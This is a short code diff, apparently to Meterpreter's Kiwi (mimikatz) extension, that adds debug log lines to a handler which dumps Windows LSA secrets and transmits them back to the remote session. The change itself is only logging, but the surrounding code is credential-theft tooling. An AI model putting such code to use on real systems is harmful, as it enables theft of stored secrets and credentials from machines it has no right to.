@@ -45,10 +45,13 @@ DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
 	DWORD result;
 	Packet * response = packet_create_response(packet);
 
-	dprintf("[KIWI] Dumping LSA Secrets");
+	dprintf("[KIWI LSA] Dumping LSA Secrets");
 
 	result = mimikatz_lsa_dump_secrets(response);
+
+	dprintf("[KIWI LSA] Dumped, transmitting response.");
 	packet_transmit_response(result, remote, response);
+	dprintf("[KIWI LSA] Done.");
 
 	return ERROR_SUCCESS;
 }
